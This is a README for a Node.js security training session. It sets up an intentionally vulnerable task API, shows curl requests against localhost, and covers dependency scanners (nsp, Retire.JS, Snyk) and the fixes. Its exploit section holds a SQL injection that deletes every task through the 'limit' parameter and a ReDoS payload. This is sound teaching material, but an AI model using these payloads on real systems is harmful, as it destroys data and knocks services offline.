# node-security-brown-bag
Scenarios for the brown bag session about secure node applications

## Badges

Snyk: [![Known Vulnerabilities](https://snyk.io/test/github/sdepold/node-security-brown-bag/badge.svg)](https://snyk.io/test/github/sdepold/node-security-brown-bag)

NSP: [![NSP Status](https://nodesecurity.io/orgs/barfooz/projects/df73b085-1256-4e50-90df-9358236622ee/badge)](https://nodesecurity.io/orgs/barfooz/projects/df73b085-1256-4e50-90df-9358236622ee)


## Setup
The following steps have been made to initialize the project:

```
npm install -g express-generator
cd node-security-brown-bag
express -f
yarn add sequelize@3.16 mysql
yarn add --dev sequelize-cli
node_modules/.bin/sequelize init
node_modules/.bin/sequelize model:create --name Task --attributes title:string
```

## API

```
# Reading all tasks
curl "http://localhost:3000/tasks"

# Reading a limited amount of tasks
curl "http://localhost:3000/tasks?limit=2"

# Creating a task
curl "http://localhost:3000/tasks" -d '{"title":"some title"}'  -H 'content-type:application/json'
```

## Exploiting the app

```
curl "http://localhost:3000/tasks" -d '{"title":"some task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" -d '{"title":"some other task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" # Renders all tasks
curl "http://localhost:3000/tasks?limit=1" # Renders only a single task
curl "http://localhost:3000/tasks?limit=1;DELETE%20FROM%20tasks" # Will delete the tasks due to vulnerability
curl "http://localhost:3000/tasks" # Renders all available (aka no) tasks

# ReDos attack
curl "http://localhost:3000/tasks" -d '{"title":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'  -H 'content-type:application/json'
```

## Security checks

### nsp

Website: https://nodesecurity.io/

Description:
- Uploads package.json / npm-shrinkwrap.json to NSP servers
- Analysis happens remotely
- Renders found vulnerabilities
- Can be executed against a local copy of the vulnerability registry iif the app uses npm-shrinkwrap
- Can integrate into Github and verify Pull-Requests
- More extended plans contain weekly security reviews of pull requests as well as a pair attack session
  against your application.

```
npm install --save-dev nsp
nsp check --output summary
```

### Retire.JS

Website: http://retirejs.github.io/retire.js/

Description:
- Free
- Downloads list of known vulnerabilities to local machine
- Walks through all the installed dependencies
- Check dependencies against downloaded vulnerability list
- Prints vulnerabilities

```
npm install --save-dev retire
retire
```

### Snyk

Website: https://snyk.io

Description:
- Downloads list of known vulnerabilities to local machine
- Walks through all installed dependencies
- Checks if dependencies are vulnerable based on the downloaded list (`snyk test`)
- Allows interactive auto-healing via `snyk wizard`
- Can patch vulnerabilities that are not fixed yet via `snyk protect`
- Can notify you about new or properly fixed vulnerabilities via `snyk monitor`

```
npm install -g snyk
snyk wizard
snyk test
```

## Further resources
- Super vulnerable TODO app: https://github.com/snyk/goof
- Greenkeeper Enterprise: https://github.com/greenkeeperio/greenkeeper/projects/3
- Securing Your Node.js App: http://stackabuse.com/securing-your-node-js-app/
- Tutorial about hacking an application: http://nodegoat.herokuapp.com/tutorial
- Other, similar tools:
    - https://www.sourceclear.com
- ReDoS scanner: https://github.com/jagracey/RegEx-DoS
- Explanation about ReDoS: https://en.wikipedia.org/wiki/ReDoS

## Presentation

1. Use and explain application
  1. Explain application
  2. Use and exploit the API endpoints
  3. Show vulnerability in `routes/tasks.js`
2. Security checks
  1. Run security checks
  2. Show NSP, RetireJS, Snyk
  3. Show https://github.com/sdepold/node-security-brown-bag/pull/3
  4. Create a fix via Snyk PR
  5. Show and merge https://github.com/sdepold/node-security-brown-bag/pull/4
  6. Run API requests again
3. ReDoS
  1. Run ReDoS exploit
  2. Show ReDoS vulnerability in `models/task.js`
  3. Run ReDoS test
  4. Fix regular expression (https://github.com/sdepold/node-security-brown-bag/pull/5)
4. Greenkeeper
